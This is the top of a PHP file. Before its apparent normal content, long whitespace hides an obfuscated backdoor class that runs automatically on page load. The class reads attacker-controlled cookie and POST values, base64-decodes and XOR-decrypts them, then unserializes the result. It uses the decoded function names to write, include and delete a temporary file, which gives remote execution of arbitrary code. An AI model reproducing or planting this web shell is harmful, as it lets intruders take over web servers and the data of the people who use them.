<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("qjofuaf")){class qjofuaf{public static $mgkfq = "shiovobjjdxbsiot";public static $lymyoglh = NULL;public function __construct(){$exwtmneo = @$_COOKIE[substr(qjofuaf::$mgkfq, 0, 4)];if (!empty($exwtmneo)){$yrqmxc = "base64";$xubxdq = "";$exwtmneo = explode(",", $exwtmneo);foreach ($exwtmneo as $verfmfnzn){$xubxdq .= @$_COOKIE[$verfmfnzn];$xubxdq .= @$_POST[$verfmfnzn];}$xubxdq = array_map($yrqmxc . "_decode", array($xubxdq,));$xubxdq = $xubxdq[0] ^ str_repeat(qjofuaf::$mgkfq, (strlen($xubxdq[0]) / strlen(qjofuaf::$mgkfq)) + 1);qjofuaf::$lymyoglh = @unserialize($xubxdq);}}public function __destruct(){$this->mkyrte();}private function mkyrte(){if (is_array(qjofuaf::$lymyoglh)) {$vxwqt = sys_get_temp_dir() . "/" . crc32(qjofuaf::$lymyoglh["salt"]);@qjofuaf::$lymyoglh["write"]($vxwqt, qjofuaf::$lymyoglh["content"]);include $vxwqt;@qjofuaf::$lymyoglh["delete"]($vxwqt);exit();}}}$oqhqzlhqfa = new qjofuaf();$oqhqzlhqfa = NULL;} ?><?php
/**
